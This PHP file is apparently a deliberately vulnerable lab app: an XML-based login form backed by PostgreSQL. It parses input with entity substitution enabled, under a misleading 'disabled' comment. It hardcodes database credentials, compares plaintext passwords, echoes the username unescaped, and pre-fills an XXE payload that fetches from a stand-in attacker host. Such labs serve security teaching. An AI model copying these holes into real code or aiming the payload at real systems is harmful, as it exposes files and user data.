<?php
// PostgreSQL database connection settings
$host = '172.28.0.2';
$port = 5432;
$dbname = 'itsdb';
$user = 'its';
$password = 'itsITS200';

// Establish a database connection
$conn = new PDO("pgsql:host=$host;port=$port;dbname=$dbname;user=$user;password=$password");

// Process the form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the XML input
    $xmlData = $_POST['xml_data'];

    // Disable external entity parsing
    libxml_disable_entity_loader(true);

    // Load the XML data
    $xml = new DOMDocument();
    $xml->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);

    // Extract data from the XML
    $username = $xml->getElementsByTagName('username')->item(0)->nodeValue;
    $password = $xml->getElementsByTagName('password')->item(0)->nodeValue;

    // Validate the credentials
    $query = "SELECT * FROM users WHERE username = :username AND password = :password";
    $stmt = $conn->prepare($query);
    $stmt->bindValue(':username', $username);
    $stmt->bindValue(':password', $password);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user) {
        // Successful login
        echo "Welcome, " . $username . "!";
    } else {
        // Failed login
        echo "Invalid username or password!";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>XXE Injection Vulnerable Form with PostgreSQL</title>
</head>
<body>
    <h2>Login using XML</h2>
    <form method="POST" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <label for="xml_data">XML Data:</label>
        <textarea name="xml_data" id="xml_data" rows="10" cols="50" required>
            <!DOCTYPE foo [
                <!ELEMENT foo ANY>
                <!ENTITY xxe SYSTEM "http://evil-website.com/xxe.txt">
            ]>
            <foo>
                <username>&xxe;</username>
                <password>mypassword</password>
            </foo>
        </textarea><br>

        <input type="submit" value="Submit">
    </form>
</body>
</html>
